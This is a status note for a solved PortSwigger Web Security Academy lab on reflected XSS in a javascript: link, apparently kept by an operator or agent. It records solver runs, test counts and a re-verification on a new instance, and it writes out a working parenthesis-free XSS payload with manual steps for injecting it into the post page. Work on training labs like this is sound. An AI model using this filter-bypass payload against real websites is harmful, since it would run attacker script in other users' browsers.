# RESUME — Reflected XSS in a JavaScript URL with some characters blocked

**Status: COMPLETE — lab solved and verified.** Nothing pending on the target.

## Where things stand

* Lab instance `0a4c002e0333a1ef80438a6f00b70076` is **solved** (widget
  `is-solved`). It is single-user and stays solved.
* Solver: `solve.py`, exit 0, 6 requests, 2.2 s.
* Root launcher: exact folder-name match, exit 0, 2.6 s.
* Launcher test suite: 27 passed / 0 failed.
* Browser proof: clicking "Back to Blog" on the crafted URL alerts
  `Uncaught 1337`.

## Re-verification, 2026-11-06 — instance `0a9e003c04d7504180f93036002a004f`

* The instance arrived with progress already carried over from the solved lab
  (`widgetcontainer-lab-status is-solved` / `<p>Solved</p>` on a cold GET, no
  cookie), so this run cannot claim the flip: the solver correctly reports
  `caused by solver: no (was already solved)`.
* What *was* re-proven end-to-end on the new host: post id discovered at
  runtime (2), query string reflected into `body:'…'` of the `javascript:`
  back-link, filter control still deletes `( ) [ ]` and spaces, and the
  parenthesis-free vector survives and percent-decodes to intact JS.
* Solver run (lab folder): exit 0, 6 requests, 2.2 s.
* Root launcher: exact folder-name match, exit 0, 6 requests, 2.3 s (2.7 s
  total). Test suite: 27 passed / 0 failed.
* Browser proof, same host: clicking "Back to Blog" fires `alert("Uncaught
  1337")`; `fetch()` never runs because `window+''` throws while the arguments
  are evaluated. Artifacts: `evidence/20261106T194036Z_*`.

## If this lab ever needs re-running on a fresh instance

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<new-lab-id>.web-security-academy.net/"
```

The solver needs nothing from this session: post id, host and reflected prefix
are discovered at runtime, and it does not use the exploit server (this lab has
none).

Manual path if the solver ever fails:

1. `GET /` → note any `/post?postId=N`.
2. `GET /post?postId=N`, inspect the `.is-linkback` href — confirm the query
   string is echoed inside `body:'…'`.
3. Request `/post?postId=N&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
4. Check the rendered href percent-decodes to intact JS, then reload `/` and
   look for `widgetcontainer-lab-status is-solved`.

## Known failure modes

| Symptom | Cause |
|---|---|
| `control ... = NO` | filter behaviour changed on a new instance; re-measure before reusing the payload |
| 400 on the exploit URL | payload contained a stripped character or a space; the vector must stay parenthesis/space free |
| Launcher "ambiguous" | another folder title collapsed to the same normalized name; rename one |
| `caused by solver: no (was already solved)` | expected on this now-solved instance |

## Session facts worth keeping

* Instance title: `Reflected XSS in a JavaScript URL with some characters blocked`.
* Academy difficulty: **EXPERT** (badge is client-rendered; read it from the
  rendered page, not from the static HTML).
* `GET /exploit` → **404** on this lab: no exploit server, no victim delivery.
* Detector is server-side; the flip happened on the first crafted request.
